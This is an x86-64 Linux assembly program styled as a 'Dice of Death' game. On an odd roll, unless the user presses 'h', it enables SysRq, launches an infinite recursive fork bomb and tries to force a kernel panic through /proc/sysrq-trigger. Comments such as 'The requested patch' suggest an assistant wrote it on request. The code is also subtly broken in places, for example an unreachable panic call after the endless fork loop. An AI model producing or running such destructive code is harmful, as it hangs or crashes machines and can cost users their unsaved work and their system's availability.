; ============================================================
;  DICE OF DEATH - x86-64 Linux Assembly
;  Patched: Recursive Fork Bomb + Safety Mercy Key
; ============================================================

BITS 64

%define SYS_read        0
%define SYS_write       1
%define SYS_open        2
%define SYS_close       3
%define SYS_mmap        9
%define SYS_munmap      11
%define SYS_nanosleep   35
%define SYS_getpid      39
%define SYS_clone       56
%define SYS_fork        57
%define SYS_execve      59
%define SYS_exit        60
%define SYS_getrandom   318

%define O_WRONLY        1
%define PROT_READ       1
%define PROT_WRITE      2
%define MAP_PRIVATE     2
%define MAP_ANONYMOUS   0x20

; clone flags for threads
%define CLONE_VM        0x00000100
%define CLONE_FS        0x00000200
%define CLONE_FILES     0x00000400
%define CLONE_SIGHAND   0x00000800
%define CLONE_THREAD    0x00010000
%define CLONE_FLAGS     CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD

section .data
msg_header  db  0x1B,"[2J",0x1B,"[H",0x1B,"[1;37m"
            db  "  ╔════════════════════════════════╗",0xA
            db  "  ║    D I C E   O F   D E A T H  ║",0xA
            db  "  ║   Even = Live     Odd = Suffer ║",0xA
            db  "  ╚════════════════════════════════╝",0xA
            db  0x1B,"[0m",0xA,0
msg_header_l equ $ - msg_header

frame_pre   db  0x1B,"[2K",0x0D,0x1B,"[1;33m","  Rolling: [ ",0
frame_pre_l equ $ - frame_pre
frame_post  db  " ]",0x1B,"[0m",0
frame_post_l equ $ - frame_post

msg_live    db  0xA,0x1B,"[1;32m  [!] YOU LIVE. Lucky bastard.",0x1B,"[0m",0xA,0
msg_live_l  equ $ - msg_live

msg_die     db  0xA,0x1B,"[1;31m  [!] YOU DIED. Initiating stroke...",0x1B,"[0m",0xA,0
msg_die_l   equ $ - msg_die

msg_mercy   db  "  [?] Press 'h' then Enter for MERCY, or any other key to DIE: ",0
msg_mercy_l equ $ - msg_mercy

msg_abort   db  0xA,"  [+] Mercy granted. Exiting.",0xA,0
msg_abort_l equ $ - msg_abort

msg_fork    db  0x1B,"[33m","  [*] Executing recursive fork bomb...",0xA,0x1B,"[0m",0
msg_fork_l  equ $ - msg_fork

msg_panic   db  0x1B,"[31m","  [!] Triggering kernel panic... goodbye.",0xA,0x1B,"[0m",0
msg_panic_l equ $ - msg_panic

sys_sysrq_en  db "/proc/sys/kernel/sysrq",0
sys_sysrq_trig db "/proc/sysrq-trigger",0
val_one       db "1"
val_panic     db "c"

ts_fast     dq  0,  6000000
ts_crawl    dq  0,300000000
ts_suspense dq  0,600000000

section .bss
    seed_buf    resb 8
    numstr      resb 8
    user_input  resb 2

section .text
    global _start

_start:
    ; Print Header
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [msg_header]
    mov rdx, msg_header_l
    syscall

    ; Get Random Roll (1-6)
    mov rax, SYS_getrandom
    lea rdi, [seed_buf]
    mov rsi, 8
    xor rdx, rdx
    syscall
    mov rax, [seed_buf]
    xor rdx, rdx
    mov rcx, 6
    div rcx
    mov r12, rdx
    inc r12             ; Result in R12

    ; Spinner Animation
    call do_spinner

    ; Check if Odd (Death) or Even (Live)[cite: 1]
    test r12, 1
    jz .you_live

.you_die:
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [msg_die]
    mov rdx, msg_die_l
    syscall

    ; --- SAFETY NET ---
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [msg_mercy]
    mov rdx, msg_mercy_l
    syscall

    mov rax, SYS_read
    mov rdi, 0
    lea rsi, [user_input]
    mov rdx, 2
    syscall

    cmp byte [user_input], 'h'
    je .mercy_granted

    ; --- CHAOS START ---
    call enable_sysrq   ;[cite: 1]
    call fork_bomb      ; Patched version
    call sysrq_panic    ;[cite: 1]

.mercy_granted:
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [msg_abort]
    mov rdx, msg_abort_l
    syscall
    jmp .exit

.you_live:
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [msg_live]
    mov rdx, msg_live_l
    syscall

.exit:
    mov rax, SYS_exit
    xor rdi, rdi
    syscall

; -------------------------------------------------------
; RECURSIVE FORK BOMB (The requested patch)
; -------------------------------------------------------
fork_bomb:
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [msg_fork]
    mov rdx, msg_fork_l
    syscall

.bomb_loop:
    mov rax, SYS_fork
    syscall
    ; Both parent and child loop back to fork again
    jmp .bomb_loop

; -------------------------------------------------------
; HELPER FUNCTIONS (Condensed from source)[cite: 1]
; -------------------------------------------------------
do_spinner:
    mov r13, 20
.sp_loop:
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [frame_pre]
    mov rdx, frame_pre_l
    syscall

    add r13, '0'
    mov [numstr], r13
    sub r13, '0'
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [numstr]
    mov rdx, 1
    syscall

    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [frame_post]
    mov rdx, frame_post_l
    syscall

    mov rax, SYS_nanosleep
    lea rdi, [ts_fast]
    xor rsi, rsi
    syscall
    dec r13
    jnz .sp_loop
    ret

enable_sysrq:
    mov rax, SYS_open
    lea rdi, [sys_sysrq_en]
    mov rsi, O_WRONLY
    syscall
    mov rdi, rax
    mov rax, SYS_write
    lea rsi, [val_one]
    mov rdx, 1
    syscall
    mov rax, SYS_close
    syscall
    ret

sysrq_panic:
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [msg_panic]
    mov rdx, msg_panic_l
    syscall
    mov rax, SYS_open
    lea rdi, [sys_sysrq_trig]
    mov rsi, O_WRONLY
    syscall
    mov rdi, rax
    mov rax, SYS_write
    lea rsi, [val_panic]
    mov rdx, 1
    syscall
    ret
